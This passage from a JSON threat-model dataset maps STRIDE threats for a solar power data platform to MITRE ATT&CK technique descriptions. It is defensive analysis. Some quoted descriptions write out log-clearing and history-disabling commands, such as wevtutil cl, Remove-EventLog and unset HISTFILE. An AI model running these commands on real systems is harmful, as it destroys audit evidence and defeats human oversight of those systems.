                    "Condition": "Valid if endpoint security tools are outdated or poorly implemented."
                },
                {
                    "Assumption": "Attackers can deploy malware through network vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if network and application vulnerabilities exist."
                },
                {
                    "Assumption": "No proper monitoring or alerting mechanisms for data logger health.",
                    "Role": "IT Operations",
                    "Condition": "Valid if there is no monitoring of device health statuses."
                }
            ],
            "Potential Impact": "System downtime affects data availability, leading to potential operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Malware",
                "Device Crash"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Excessive, malformed requests flood the dashboard APIs, causing service degradation or outages.",
            "Assumptions": [
                {
                    "Assumption": "API endpoint does not have request rate limiting.",
                    "Role": "API Developer",
                    "Condition": "Valid if rate limiting is not implemented."
                },
                {
                    "Assumption": "Malformed requests can reach the backend without being filtered.",
                    "Role": "Security Engineer",
                    "Condition": "Valid if input validation mechanisms are insufficient."
                },
                {
                    "Assumption": "Service monitoring tools do not alert on unusual traffic patterns.",
                    "Role": "IT Operations",
                    "Condition": "Valid if traffic anomalies are not detected in real-time."
                }
            ],
            "Potential Impact": "Service degradation or outages affect system availability, making the dashboard non-functional in critical times.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "API Flood",
                "Service Degradation"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Insufficient role-based access controls (RBAC) allow a regular user to gain administrative privileges on the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "RBAC policies are not properly implemented.",
                    "Role": "System Administrator",
                    "Condition": "Valid if access policies are misconfigured or too permissive."
                },
                {
                    "Assumption": "Users can elevate privileges through application vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if bugs or vulnerabilities in application code exist."
                },
                {
                    "Assumption": "Monitoring and alerting for privilege changes are weak.",
                    "Role": "Security Analyst",
                    "Condition": "Valid if activities related to privilege escalation are not logged or reviewed."
                }
            ],
            "Potential Impact": "Unauthorized privilege escalation affects data integrity and confidentiality, enabling access to restricted areas and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "RBAC",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of a zero-day vulnerability in the LIGHT-TOREADOR infrastructure allows attackers to execute commands with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Application contains an unpatched zero-day vulnerability.",
                    "Role": "Vulnerability Researcher",
                    "Condition": "Valid if software patches are not timely applied."
                },
                {
                    "Assumption": "Attackers can access and exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attackers are aware and capable of exploiting the vulnerability."
                },
                {
                    "Assumption": "No robust intrusion detection/prevention system (IDS/IPS) in place.",
                    "Role": "Network Security Engineer",
                    "Condition": "Valid if intrusion detection mechanisms are lacking."
                }
            ],
            "Potential Impact": "Command execution with elevated privileges affects data integrity and system control, allowing attackers to manipulate sensitive operations.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Zero-day Exploitation",
                "Command Execution"
            ],
            "mitre_technique": {
                "name": "Indirect Command Execution",
                "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",
                "id": "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e",
                "technique_id": "T1202"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware leveraging BYOVD (Bring Your Own Vulnerable Driver) techniques to gain elevated privileges on the LIGHT platform.",
            "Assumptions": [
                {
                    "Assumption": "BYOVD techniques can bypass kernel-level protections.",
                    "Role": "Malware Developer",
                    "Condition": "Valid if system defenses against this technique are weak."
                },
                {
                    "Assumption": "Attackers can deploy BYOVD malware.",
                    "Role": "Attacker",
                    "Condition": "Valid if attackers are capable of dropping malicious drivers."
                },
                {
                    "Assumption": "Endpoint protection systems inadequately monitor kernel driver modifications.",
                    "Role": "System Security Engineer",
                    "Condition": "Valid if kernel-level modifications are not monitored."
                }
            ],
            "Potential Impact": "Elevation of privileges affects system integrity and control, allowing malware to perform unauthorized operations at a highly privileged level.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "BYOVD",
                "Kernel Exploitation"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "3",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof sensor data transmissions, misleading the data logger to collect false information.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to the network",
                    "Role": "Network Administrator",
                    "Condition": "Network is not properly secured"
                },
                {
                    "Assumption": "Sensors do not use strong authentication methods",
                    "Role": "System Designer",
                    "Condition": "Deployment avoids robust security due to cost or complexity"
                }
            ],
            "Potential Impact": "Unauthorized data can lead to inaccurate predictions and optimization failures.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "sensor"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could use a fake dashboard interface to steal employee login credentials.",
            "Assumptions": [
                {
                    "Assumption": "Attackers can create convincing phishing sites",
                    "Role": "Security Team",
                    "Condition": "Employees are not trained to identify phishing"
                },
                {
                    "Assumption": "Dashboard does not employ multi-factor authentication",
                    "Role": "System Administrator",
                    "Condition": "Cost or user convenience prioritized over security"
                }
            ],
            "Potential Impact": "Compromised credentials can lead to unauthorized access to sensitive data and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "spoofing",
                "user credentials"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate the data logger to send malicious data to the receiver.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks proper device authentication mechanisms",
                    "Role": "Network Administrator",
                    "Condition": "Secure protocols are not in place"
                },
                {
                    "Assumption": "Receiver does not validate the source of the incoming data",
                    "Role": "System Designer",
                    "Condition": "Focus on performance over security"
                }
            ],
            "Potential Impact": "Malicious data could compromise the integrity of the pre-processed data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could alter the data collected by the data logger before it is transmitted to the receiver.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has physical or network access to the data logger",
                    "Role": "Network Administrator",
                    "Condition": "Physical or network security is inadequate"
                },
                {
                    "Assumption": "Data transmission lacks encryption",
                    "Role": "System Designer",
                    "Condition": "Encryption not implemented for performance or cost reasons"
                }
            ],
            "Potential Impact": "Compromised data integrity could lead to faulty models and incorrect predictions.",
            "MITRE ATT&CK Keywords": [
                "data manipulation",
                "tampering",
                "network"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the AI/ML models stored in the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls on cloud storage",
                    "Role": "Cloud Administrator",
                    "Condition": "Access policies are not properly configured"
                },
                {
                    "Assumption": "Lack of model integrity checks",
                    "Role": "ML Engineer",
                    "Condition": "Integrity verification mechanisms are not in place"
                }
            ],
            "Potential Impact": "Tampered models could generate incorrect predictions, affecting system efficiency.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud",
                "model manipulation"
            ],
            "mitre_technique": {
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
                "technique_id": "T1578"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify the metadata related to solar power plants.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient protection on metadata storage",
                    "Role": "Database Administrator",
                    "Condition": "Database lacks robust access controls"
                },
                {
                    "Assumption": "Metadata is not regularly verified for integrity",
                    "Role": "System Operator",
                    "Condition": "Verification processes are not often followed"
                }
            ],
            "Potential Impact": "Corrupted metadata could lead to inaccurate power optimization and faulty predictions.",
            "MITRE ATT&CK Keywords": [
                "metadata manipulation",
                "tampering",
                "database"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could deny actions taken within the dashboard, claiming they did not log in or perform the actions.",
            "Assumptions": [
                {
                    "Assumption": "System lacks robust activity logging",
                    "Role": "System Administrator",
                    "Condition": "Logging mechanisms are not in place"
                },
                {
                    "Assumption": "No multi-factor authentication",
                    "Role": "Security Team",
                    "Condition": "Deployment prefers user convenience over security"
                }
            ],
            "Potential Impact": "Difficulty in audit trails, making it challenging to attribute actions accurately.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee could claim they did not deploy certain configurations within the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "No configuration change logs",
                    "Role": "Cloud Administrator",
                    "Condition": "System lacks configuration tracking mechanisms"
                },
                {
                    "Assumption": "Weak user authentication methods",
                    "Role": "System Designer",
                    "Condition": "Lower security for ease of use"
                }
            ],
            "Potential Impact": "Issues in tracking changes can lead to unresolved mistakes affecting system performance.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud",
                "configuration management"
            ],
            "mitre_technique": {
                "name": "Revert Cloud Instance",
                "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",
                "id": "attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1",
                "technique_id": "T1578.004"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies sending specific commands to sensors in the power grid.",
            "Assumptions": [
                {
                    "Assumption": "Commands are not logged with sufficient detail",
                    "Role": "System Operator",
                    "Condition": "Lack of detailed command logging"
                },
                {
                    "Assumption": "No proper authentication of command sources",
                    "Role": "Network Administrator",
                    "Condition": "Use of basic authentication methods"
                }
            ],
            "Potential Impact": "Difficulty in determining the origin of commands can cause management and troubleshooting issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "command logging",
                "sensor network"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could intercept unencrypted sensor data in transit between the sensors and data logger.",
            "Assumptions": [
                {
                    "Assumption": "Sensor data transmissions are not encrypted",
                    "Role": "System Designer",
                    "Condition": "Encryption is overlooked for performance"
                },
                {
                    "Assumption": "Attacker has access to the network",
                    "Role": "Network Administrator",
                    "Condition": "Lack of network security measures"
                }
            ],
            "Potential Impact": "Sensitive operational data could be exposed to unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "network",
                "sensor"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to the TOREADOR platform could result in the disclosure of sensitive model training data.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls on cloud storage",
                    "Role": "Cloud Administrator",
                    "Condition": "Inadequate IAM policies"
                },
                {
                    "Assumption": "User accounts use weak passwords",
                    "Role": "System Users",
                    "Condition": "Lack of password policies"
                }
            ],
            "Potential Impact": "Exposure of sensitive data used for model training can lead to significant data breaches.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "cloud",
                "access control"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
